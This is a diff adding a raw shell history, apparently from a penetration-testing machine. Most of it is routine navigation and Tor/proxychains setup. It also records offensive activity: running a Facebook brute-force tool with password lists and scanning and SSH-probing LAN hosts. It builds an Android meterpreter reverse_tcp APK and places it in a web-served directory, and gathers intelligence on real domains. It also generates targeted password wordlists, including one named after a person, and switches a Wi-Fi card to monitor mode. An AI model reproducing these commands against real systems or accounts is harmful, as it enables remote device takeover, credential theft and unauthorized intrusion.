@@ -1,0 +1,804 @@
+    1  ls -l
+    2  cd /
+    3  clear
+    4  ls -l
+    5  cd investigador
+    6  ls
+    7  mkdir scripts
+    8  clear
+    9  ls
+   10  mv scripts 01_00_scripts
+   11  clear
+   12  ls
+   13  ls -l
+   14  cd /
+   15  sudo mkdir wallpaper && sudo chown whoami:whoami wallpaper
+   16  clear
+   17  ls
+   18  ls -l
+   19  exit
+   20  sudo apt upgrade
+   21  sudo apt update
+   22  sudo apt upgrade
+   23  sudo dpkg --configure -a
+   24  sudo apt update
+   25  sudo apt upgrade
+   26  sudo apt install tor
+   27  proxychains
+   28  clear
+   29  sudo service tor status
+   30  sudo service tor start
+   31  service tor status
+   32  sudo nano /etc/proxychains4.conf
+   33  proxychains4 firefox
+   34  sudo nano /etc/proxychains.conf
+   35  proxychains firefox
+   36  sudo nano /etc/proxychains4.conf
+   37  service tor status
+   38  proxychains firefox
+   39  sudo service tor restart
+   40  service tor status
+   41  proxychains firefox
+   42  proxychains4 firefox
+   43  exit
+   44  service tor status
+   45  service tor stop
+   46  clear
+   47  service tor status
+   48  sudo service tor start
+   49  proxychains firefox
+   50  service tor status
+   51  sudo service tor start
+   52  proxychains firefox
+   53  exit
+   54  history
+   55  sudo nano /etc/proxychains4.conf
+   56  sudo service tor status
+   57  sudo service tor start
+   58  proxychains firefox
+   59  proxychains4 firefox
+   60  service tor status
+   61  proxychains firefox
+   62  sudo proxychains firefox
+   63  proxychains firefox
+   64  clear
+   65  proxychains firefox
+   66  sudo nano /etc/proxychains4.conf
+   67  proxychains firefox
+   68  cd /investigador
+   69  clear
+   70  ls
+   71  cd 01_00_scripts
+   72  clear
+   73  ls
+   74  mkdir sh
+   75  cd sh
+   76  nano anon.sh
+   77  clear
+   78  ls
+   79  cd /
+   80  clear
+   81  ls
+   82  ls -l
+   83  sudo mkdir downloads_browsers
+   84  sudo chown whoami:whoami downloads_browsers
+   85  sudo apt install ntp
+   86  sudo dpkg --get-selections ntp
+   87  sudo nano /etc/ntp.conf
+   88  nano /etc/ntp.conf
+   89  sudo nano /etc/ntp.conf
+   90  systemctl enable ntp.service
+   91  sudo systemctl enable ntp.service
+   92  systemctl restart ntp.service
+   93  sudo systemctl enable ntpd.service
+   94  sudo apt install ntp
+   95  sudo dpkg --get-selections ntp
+   96  ls -l /etc
+   97  sudo systemctl enable ntpd.service
+   98  sudo apt update
+   99  sudo apt dist-upgrade
+  100  sudo apt install -f
+  101  clear
+  102  sudo apt install ntp ntpdate
+  103  sudo nano /etc/ntp.conf
+  104  sudo mv /etc/ntp.conf /etc/ntp.conf.org
+  105  sudo nano /etc/ntp.conf
+  106  sudo service ntp restart
+  107  sudo service ntp start
+  108  ntpq -p -n
+  109  sudo service tor stop
+  110  ntpq -p -n
+  111  sudo service ntp start
+  112  clear
+  113  sysctl -p
+  114  sudo service ntpsec restart
+  115  sudo nano /etc/ntpsec/ntp.conf
+  116  sudo service ntpsec restart
+  117  ntpq -c rl
+  118  exit
+  119  service tor status
+  120  sudo service tor start
+  121  sudo nano /etc/nfs.conf.d
+  122  sudo nano /etc/ntp.conf
+  123  sudo service tor start
+  124  proxychains firefox
+  125  clear
+  126  ls
+  127  exit
+  128  cd /
+  129  clear
+  130  cd investigador
+  131  clear
+  132  ls
+  133  cd 01_00_scripts
+  134  clear
+  135  ls
+  136  cd sh
+  137  ls
+  138  nano anon.sh
+  139  ./anon.sh
+  140  sudo ./anon.sh
+  141  nano anon.sh
+  142  sudo apt update
+  143  sudo apt upgrade
+  144  clear
+  145  sudo nano /etc/proxychains4.conf
+  146  sudo service tor start
+  147  proxychains firefox
+  148  sudo nano /etc/proxychains4.conf
+  149  proxychains firefox
+  150  sudo nano /etc/proxychains4.conf
+  151  sudo service tor restart
+  152  proxychains firefox
+  153  sudo service tor stop
+  154  clear
+  155  sudo service tor start
+  156  proxychains firefox www.google.com
+  157  cd -l
+  158  ls -l
+  159  cd Imagens
+  160  ls
+  161  cd /
+  162  clear
+  163  ls -l
+  164  cd downloads_browsers
+  165  ls
+  166  cd ..
+  167  clear
+  168  w
+  169  pwd
+  170  ls -l
+  171  ls downloads_browsers
+  172  clear
+  173  ls
+  174  cd downloads_browsers
+  175  clear
+  176  ls
+  177  mkdir t1
+  178  mkdir t2
+  179  ls
+  180  cd /
+  181  clear
+  182  ls -l
+  183  cd investigador
+  184  clear
+  185  ls -l
+  186  cd 01_00_scripts
+  187  ls
+  188  mkdir python
+  189  cd python
+  190  ls
+  191  clear
+  192  git clone https://github.com/IAmBlackHacker/Facebook-BruteForce
+  193  python3 -m pip install requests bs4
+  194  ls
+  195  cd Facebook-BruteForce
+  196  clear
+  197  ls
+  198  python3 fb.py
+  199  ls -l
+  200  rm passwords.txt
+  201  ls
+  202  mv passwords2.txt passwords.txt
+  203  python3 fb.py
+  204  ls
+  205  python3 fb2.py
+  206  python fb2.py
+  207  python3 fb.py
+  208  pwd
+  209  cd /
+  210  clear
+  211  ifconfig
+  212  cd investigador/01_00_scripts/python
+  213  python3 -m pip install mechanize
+  214  ls -l
+  215  cd Facebook-BruteForce
+  216  ls
+  217  cp passwords.txt passwords2.txt
+  218  nano passwords2.txt
+  219  sudo nano /etc/proxychains4.conf
+  220  sudo service tor start
+  221  proxychains firefox
+  222  service ssh status
+  223  service ssh start
+  224  ip addr
+  225  netstat
+  226  clear
+  227  nmap -a
+  228  nmap -a host
+  229  clear
+  230  nmap 10.0.2.15
+  231  ip addr
+  232  clear
+  233  ls
+  234  cd /
+  235  clear
+  236  ls
+  237  clear
+  238  ls
+  239  cd wallpaper
+  240  ls
+  241  cd hacker
+  242  ls
+  243  exit
+  244  service tor start
+  245  clear
+  246  ls
+  247  cd /
+  248  clear
+  249  ls
+  250  clear
+  251  ls
+  252  clear
+  253  ls
+  254  exit
+  255  clear
+  256  exit
+  257  cd /
+  258  clear
+  259  ls -l /wallpaper/hacker
+  260  ip addr
+  261  service ssh stop
+  262  cat /home/renan/.ssh/id_rsa.pub
+  263  cat /home/whoami/.ssh/id_rsa.pub
+  264  w
+  265  wd
+  266  clear
+  267  pwd
+  268  cd home
+  269  cd whoami
+  270  clear
+  271  ls
+  272  cat .ssh/id_rsa.pub
+  273  service ssh start
+  274  sudo apt install putty
+  275  sudo apt install mobaexterm
+  276  clear
+  277  exit
+  278  service ssh status
+  279  service ssh start
+  280  ip addr
+  281  clear
+  282  ls
+  283  cd /
+  284  clear
+  285  ls
+  286  cd wallpaper
+  287  clear
+  288  ls
+  289  cd /
+  290  clear
+  291  ls
+  292  service ssh status
+  293  netstat
+  294  nmap -?
+  295  nmap -help
+  296  nmap -v 192.168.0.171
+  297  nmap 192.168.0.171
+  298  netstat -a
+  299  netstat -?
+  300  netstat -ar
+  301  clear
+  302  nmap 192.168.0.171
+  303  nmap 192.168.0.174
+  304  ssh hilel@192.167.0.191
+  305  ssh hilel@192.168.0.191
+  306  ssh administrador@192.168.0.191
+  307  ssh admin@192.168.0.191
+  308  ssh hilel@192.168.0.191
+  309  clear
+  310  ssh hilel@192.168.0.191
+  311  ls
+  312  pwd
+  313  clear
+  314  whoami
+  315  clear
+  316  ls -l
+  317  ssh
+  318  ssh hilel@192.168.0.191:22
+  319  ssh -p 22 hilel@192.168.0.191
+  320  ssh -p 23 hilel@192.168.0.191
+  321  ssh -p 22 hilel@192.168.0.191
+  322  exit
+  323  service ssh status
+  324  clear
+  325  ping 192.168.0.191
+  326  ip addr
+  327  clear
+  328  ifconfig
+  329  clear
+  330  ip config
+  331  ip addr
+  332  ping 192.168.0.191
+  333  ping 192.168.0.173
+  334  clear
+  335  nmap -sS 192.168.0.191
+  336  sudo nmap -sS 192.168.0.191
+  337  sudo service tor start
+  338  proxychains ssh -p 22 hilel@192.168.0.191
+  339  sudo proxychains ssh -p 22 hilel@192.168.0.191
+  340  service tor stop
+  341  exit
+  342  service ssh status
+  343  ssh -p 22 hilel@192.168.0.191
+  344  service ssh start
+  345  service ssh status
+  346  ssh -p 22 hilel@192.168.0.191
+  347  sudo ssh -p 22 hilel@192.168.0.191
+  348  nmap 192.168.0.173
+  349  man nmao
+  350  man nmap
+  351  sudo ssh -p 22 hilel@192.168.0.191
+  352  service ssh stop
+  353  clear
+  354  exit
+  355  proxychains ssh -p 22 hilel@192.168.0.191
+  356  proxychains ping 192.168.0.191
+  357  ssh hilel@192.168.0.191
+  358  ssh admin@192.168.0.191
+  359  proxychains ping 192.168.0.191
+  360  ip addr
+  361  netstat
+  362  ping 192.168.0.173
+  363  proxychains ping 192.168.0.173
+  364  pwd
+  365  ls
+  366  cd /
+  367  ls
+  368  cd investigador/01_00_scripts/sh
+  369  clear
+  370  ls
+  371  nano anon.sh
+  372  ./anon.sh
+  373  sudo ./anon.sh
+  374  cd /
+  375  clear
+  376  sudo service tor start
+  377  proxychains firefox
+  378  ping 192.168.0.191
+  379  sudo ping 192.168.0.191
+  380  sudo ssh -p 22 hilel@192.168.0.191
+  381  sudo ping 192.168.0.191
+  382  exit
+  383  nmap 192.168.0.198
+  384  nmap -sV --version-trace 192.168.0.198
+  385  nmap -sV 192.168.0.198
+  386  nmap 192.168.0.198
+  387  ssh root@192.168.0.198
+  388  exit
+  389  arp -a
+  390  netstat -ar
+  391  nmap
+  392  nmap -sS 192.168.0.1/24
+  393  nmap 192.168.0.1/24
+  394  nmap -v 192.168.0.1/24
+  395  exit
+  396  nmap -v 192.168.0.1/24
+  397  nmap -v 192.168.0.2/24
+  398  nmap -V 192.168.0.1/24
+  399  nmap -v 192.168.0.2/24
+  400  nmap -V 192.168.0.1/24
+  401  nmap -v 192.168.0.2/24
+  402  ping 192.168.0.208
+  403  sudo ssh -p 22 oem@192.168.0.208
+  404  telnet 192.168.0.208
+  405  telnet
+  406  clear
+  407  sudo nmap -sS 192.168.0.208
+  408  nmap -V 192.168.0.1/24
+  409  nmap -v 192.168.0.1/24
+  410  sudo ssh -p 22 oem@192.168.0.208
+  411  sudo iptables -L
+  412  sudo ssh oem@192.168.0.208
+  413  sudo ssh -p 22 oem@192.168.0.208
+  414  ping 10.0.2.15
+  415  ping 192.168.0.247
+  416  sudo ssh -p -22 vitimawin7ulti@192.168.0.247
+  417  telnet
+  418  wfsconsole
+  419  dig -h
+  420  dig rabinogloiber.com -r ns
+  421  dig rabinogloiber.com -t mx
+  422  dig rabinogloiber.com -r ns
+  423  dig -h
+  424  dir rabinogloiber.com -r mx
+  425  dir rabinogloiber.com -t mx
+  426  clear
+  427  dig rabinogloiber.com -t mx
+  428  ifconfig
+  429  ifconfig
+  430  ifconfig | grep eth0
+  431  ifconfig | grep inet
+  432  exit
+  433  cd /var/www
+  434  ls
+  435  cd html
+  436  ls
+  437  clear
+  438  ls
+  439  ping 10.0.2.15
+  440  ping 192.168.0.211
+  441  clear
+  442  ping 192.168.0.211
+  443  clear
+  444  ping 192.168.0.211
+  445  netdiscover
+  446  sudo netdiscover
+  447  cd /
+  448  clear
+  449  ls
+  450  cd investigador
+  451  clear
+  452  ls
+  453  mkdir 01_01_meta
+  454  cd 01_01_meta
+  455  clear
+  456  ls
+  457  msfvenom
+  458  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.175
+  459  ls
+  460  sudo apt update
+  461  sudo apt upgrade
+  462  sudo apt install apache
+  463  sudo apt install apache2
+  464  sudo service apache2
+  465  sudo service apache2 start
+  466  service apache2 status
+  467  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.175 LPORT=4444 R > /var/www/html/toramulher.apk
+  468  sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.175 LPORT=4444 R > /var/www/html/toramulher.apk
+  469  sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.175 LPORT=4444 R > ./toramulher.apk
+  470  ls
+  471  tar -czf toramulher.apk
+  472  tar -czf toramulher.tar.gz toramulher.apk
+  473  ls
+  474  sudo msfdb init
+  475  sudo service postgresql status
+  476  msfconsole
+  477  clear
+  478  msfconsole
+  479  clear
+  480  ping google.com
+  481  clear
+  482  ping 192.168.0.1
+  483  exit
+  484  script --h
+  485  clear
+  486  cd /
+  487  ls
+  488  cd investigador
+  489  clear
+  490  ls
+  491  script -a -f teste.log
+  492  ls
+  493  cat teste.log
+  494  clear
+  495  cat teste.log
+  496  exit
+  497  theharvester -d globo.com -l 200 -b bing
+  498  theHarvester -d globo.com -l 200 -b bing
+  499  exit
+  500  sudo apt install arduino -y
+  501  lsusb
+  502  sudo apt install libusb-dev
+  503  sudo service tor start
+  504  sudo proxychains ping veyrom.com.br
+  505  ping 192.168.0.173
+  506  ifconfig
+  507  ping 23.227.38.65
+  508  clear
+  509  dig navinet.com.br -t -mx
+  510  dig defhack.com -t -mx
+  511  dig defhack.com -t mx
+  512  dig vst.com.br -t mx
+  513  dig vstsolutions.com.br -t mx
+  514  dig vstsolution.com.br -t mx
+  515  dig -h
+  516  clear
+  517  dig systemar.com.br -t mx
+  518  sudo apt update
+  519  sudo apt upgrade
+  520  sudo service tor start
+  521  proxychains firefox
+  522  sudo service tor start
+  523  proxychains firefox
+  524  wget -U
+  525  wget -?
+  526  wget /?
+  527  man wget
+  528  sudo service tor start
+  529  proxychains firefox
+  530  wget -U
+  531  wget -?
+  532  wget /?
+  533  man wget
+  534  btscanner
+  535  apt update
+  536  sudo apt update
+  537  sudo apt install btscanner
+  538  btscanner
+  539  hciconfig
+  540  hcitoll scan
+  541  hcitool scan
+  542  man hciconfig
+  543  man btscanner
+  544  btscanner --help
+  545  exit
+  546  btscanner
+  547  ifconfig
+  548  sudo pip3 install selenium
+  549  cd /
+  550  clear
+  551  cd investigador
+  552  ls
+  553  python3 -m pip install webdriver-manager
+  554  sudo pip3 install webdriver-manager
+  555  ls -l
+  556  python3 bffb.py
+  557  exit
+  558  cd /
+  559  clear
+  560  ls
+  561  cd investigador
+  562  ls
+  563  mkdir 99_99_ferramentas
+  564  clear
+  565  ls
+  566  cd 99_99_ferramentas
+  567  git clone https://github.com/IAmBlackHacker/Facebook-BruteForce
+  568  clear
+  569  ls
+  570  cd Facebook-BruteForce
+  571  ls
+  572  python3 fb2.py
+  573  python3 fb.py
+  574  ls
+  575  history
+  576  history |more
+  577  clear
+  578  ls
+  579  nano passwords.txt
+  580  python3 fb.py
+  581  nano passwords.txt
+  582  python3 fb.py
+  583  python3 -m pip install requests bs4
+  584  python3 -m pip install mechanize
+  585  python3 fb2.py
+  586  python3 fb.py
+  587  clear
+  588  cd /downloads_browsers
+  589  ls
+  590  cd tor-browser
+  591  clear
+  592  ls
+  593  start-tor-browser.desktop
+  594  ./start-tor-browser.desktop
+  595  sudo apt-get install torbrowser-launcher
+  596  apt-get update
+  597  sudo apt-get update
+  598  sudo apt-get upgrade
+  599  clear
+  600  exit
+  601  sudo apt-get update
+  602  ls
+  603  man ls
+  604  ls -l
+  605  man ls -l
+  606  man ls -f
+  607  ls -f
+  608  ls -a
+  609  ls -A
+  610  clear
+  611  ls -A
+  612  clear
+  613  ls -a
+  614  man ls
+  615  cd /
+  616  clear
+  617  ls
+  618  cd investigador
+  619  ls
+  620  touch teste.dat
+  621  ls
+  622  clear
+  623  ls
+  624  cat teste.log
+  625  rm teste.log
+  626  clear
+  627  ls
+  628  clear
+  629  cd /
+  630  clear
+  631  sudo apt-get update
+  632  sudo apt-get crunch
+  633  sudo apt-get install crunch
+  634  cd /usr
+  635  ls
+  636  cd share
+  637  ls
+  638  cd crunch
+  639  ls
+  640  crunch 2 4 1234567890 -o wordlist.txt
+  641  ls
+  642  sudo crunch 2 4 1234567890 -o wordlist.txt
+  643  ls
+  644  sudo crunch 10 10 1234567890 -o wordlist2.txt
+  645  sudo crunch 2 4 -f charset.lst mixalpha-numeric -o wordlist3.txt
+  646  cat wordlist3.txt
+  647  clear
+  648  ls
+  649  rm *.txt
+  650  clear
+  651  ls
+  652  crunch stop
+  653  man crunch
+  654  rm crunch
+  655  crunch
+  656  aircrack
+  657  sudo aircrack
+  658  aircrack-ng
+  659  cd /usr/share/crunch
+  660  ls
+  661  rm *.txt
+  662  sudo rm *.txt
+  663  ls
+  664  john
+  665  cd /
+  666  ls
+  667  cd investigador
+  668  ls
+  669  cd 01_00_scripts
+  670  clear
+  671  ls
+  672  crunch
+  673  john
+  674  clear
+  675  cd ..
+  676  clear
+  677  ls
+  678  mkdir 99_01_wordlists
+  679  clear
+  680  ls
+  681  cd 99_01_wordlists
+  682  clear
+  683  ls -l /usr/share/wordlists
+  684  sudo crunch 8 10 -f charset.lst mixalfa-numeric -o wl1.txt
+  685  sudo crunch 8 10 -f /usr/share/crunch/charset.lst mixalfa-numeric -o wl1.txt
+  686  ls /usr/share/crunch
+  687  sudo crunch 8 10 -f /usr/share/crunch/charset.lst mixalfa-numeric -o ./wl1.txt
+  688  cat /usr/share/crunch/charset.lst
+  689  sudo crunch 8 10 -f /usr/share/crunch/charset.lst mixalpha-numeric -o ./wl1.txt
+  690  ls
+  691  cat start
+  692  cat START
+  693  clear
+  694  ls
+  695  rm START
+  696  ls
+  697  sudo rm START
+  698  clear
+  699  ls
+  700  apt-get update python3
+  701  man apt-get
+  702  clear
+  703  cupp -i
+  704  ls
+  705  cat marilei.txt
+  706  cat marilei.txt | more
+  707  cupp -a
+  708  cewl
+  709  mkdir cewl
+  710  cd cewl
+  711  ls
+  712  cewl -m 4 -w wordlist.txt -d 0 -v https://web.whatsapp.com/
+  713  clear
+  714  ls
+  715  cat wordlist.txt
+  716  clear
+  717  exit
+  718  cd /
+  719  clear
+  720  ls
+  721  cd investigador
+  722  clear
+  723  ls
+  724  cd 99_99_ferramentas
+  725  clear
+  726  ls
+  727  mkdir cupp
+  728  clear
+  729  ls
+  730  cd cupp
+  731  clear
+  732  ls
+  733  sudo apt-get install cupp
+  734  ver
+  735  lsb_release
+  736  lsb_release -a
+  737  ifconfig
+  738  iw dev wlan0 info
+  739  clear
+  740  ifconfig
+  741  exit
+  742  ifconfig -a
+  743  iw dev eth1 info
+  744  sudo iw dev eth1 info
+  745  clear
+  746  airmon-ng
+  747  su
+  748  sudo ifconfig
+  749  ifconfig
+  750  clear
+  751  ifconfig
+  752  iw dev eth0 info
+  753  iwconfig
+  754  exit
+  755  cd /downloads_browsers
+  756  clear
+  757  ls
+  758  tar -jxvf compat-wireless-2010-06-28.tar.bz2
+  759  clear
+  760  ls
+  761  cd compat-wireless-2010-06-28
+  762  ls
+  763  su
+  764  sudo make unload
+  765  sudo make load
+  766  iwconfig
+  767  clear
+  768  cd /
+  769  clear
+  770  iw dev wlan0 info
+  771  ifconfig wlan0 down
+  772  sudo ifconfig wlan0 down
+  773  ifconfig
+  774  sudo airmon-ng start wlan0
+  775  ifconfig
+  776  iw dev wlan0mon info
+  777  airmon-ng check kill
+  778  sudo airmon-ng check kill
+  779  sudo airmon-ng stop wlan0mon
+  780  ifconfig
+  781  ifconfig -a
+  782  airmon-ng start wlan0
+  783  sudo airmon-ng start wlan0
+  784  ifconfig
+  785  sudo airmon-ng stop wlan0mon
+  786  clear
+  787  ifconfig -a
+  788  iw dev wlan0 interface add mon0 type monitor
+  789  sudo iw dev wlan0 interface add mon0 type monitor
+  790  ifconfig
+  791  ifconfig -a
+  792  ifconfig mon up
+  793  ifconfig mon0 up
+  794  sudo ifconfig mon0 up
+  795  ifconfig
+  796  clear
+  797  ifconfig
+  798  clear
+  799  ifconfig
+  800  iw dev wlan0 info
+  801  history
+  802  ls
+  803  cd investigador
+  804  ls
